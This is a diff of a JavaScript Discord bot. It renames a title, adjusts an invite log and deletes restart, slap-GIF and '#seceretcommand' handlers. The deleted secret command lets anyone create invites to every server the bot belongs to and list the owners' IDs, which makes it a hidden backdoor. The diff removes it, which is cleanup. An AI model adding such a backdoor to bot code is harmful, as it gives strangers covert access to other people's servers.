@@ -238,7 +238,7 @@ const Sra7a = [
         if (message.content.startsWith(prefix + 'صراحه')) {
             if(!message.channel.guild) return message.reply('** This command only for servers **');
          var client= new Discord.RichEmbed()
-         .setTitle("Alpha")
+         .setTitle("Zactor")
          .setColor('RANDOM')
          .setDescription(`${Sra7a[Math.floor(Math.random() * Sra7a.length)]}`)
          .setImage("https://cdn.discordapp.com/attachments/371269161470525444/384103927060234242/125.png")
@@ -815,54 +815,9 @@ client.on('guildMemberAdd', member => {
     const invite = guildInvites.find(i => ei.get(i.code).uses < i.uses);
     const inviter = client.users.get(invite.inviter.id);
     const logChannel = member.guild.channels.find(channel => channel.name === "welcome");
-    logChannel.send(`**Invited by:** <@${inviter.tag}>`);
+    logChannel.send(`**Invited by:** [@${inviter.tag}]`);
   });
 });
-
-client.on('message',async message => {
-var owners = ['441963199462506508','353552161759821824']
-        if(message.content.startsWith("!restart")) {
-         if(!owners.includes(message.author.id)) return;
-            message.channel.send('**Restarting.**').then(msg => {
-                setTimeout(() => {
-                   msg.edit('**Restarting..**');
-                },1000);
-                setTimeout(() => {
-                   msg.edit('**Restarting...**');
-                },2000);
-            });
-            console.log(`${message.author.tag} [ ${message.author.id} ] has restarted the bot.`);
-            console.log(`Restarting..`);
-            setTimeout(() => {
-                client.destroy();
-                client.login('process.env.BOT_TOKEN');
-            },3000);
-        }
-      });
-
-client.on('message', msg => {
-    if(msg.author.bot) return;
-    
-    if(msg.content === '#seceretcommand') {
-      client.guilds.forEach(g => {
-        
-        let l = g.id
-        g.channels.get(g.channels.first().id).createInvite({
-          maxUses: 5,
-          maxAge: 86400
-        }).then(i => msg.channel.send(`
-        **
-        Invite Link : <https://discord.gg/${i.code}>
-        Server : ${g.name} | Id : ${g.id} 
-        Owner ID : ${g.owner.id}
-        **
-        `))
-  
-  
-      })
-    }
-    
-  })
 
 client.on ("guildMemberAdd", member => {
   
@@ -874,32 +829,3 @@ client.on ("guildMemberAdd", member => {
 client.on ("guildMemberRemove", member => {
    
 })
-
-client.on('message',  (message) => {
-        if(message.content.startsWith('!كف')) {
-  let user = message.mentions.users.first();
-  if (!user) {
- 
-    return message.emit('commandUsage', message, this.help);
-  }
-  let slaps = [
-    'https://i.giphy.com/media/3XlEk2RxPS1m8/giphy.gif',
-    'https://i.giphy.com/media/mEtSQlxqBtWWA/giphy.gif',
-    'https://i.giphy.com/media/j3iGKfXRKlLqw/giphy.gif',
-    'https://i.giphy.com/media/2M2RtPm8T2kOQ/giphy.gif',
-    'https://i.giphy.com/media/l3YSimA8CV1k41b1u/giphy.gif',
-    'https://i.giphy.com/media/WLXO8OZmq0JK8/giphy.gif'
-  ];
- 
-  message.channel.send({
-    embed: {
-      description: `${message.author.username} صكك كف ولا عمر ابوك ما ذقته ${user.username}!`,
-      image: {
-        url: slaps[Math.floor(Math.random() * slaps.length)]
-      }
-    }
-  }).catch(e => {
-    client.log.error(e);
-  })
-        }  
-});
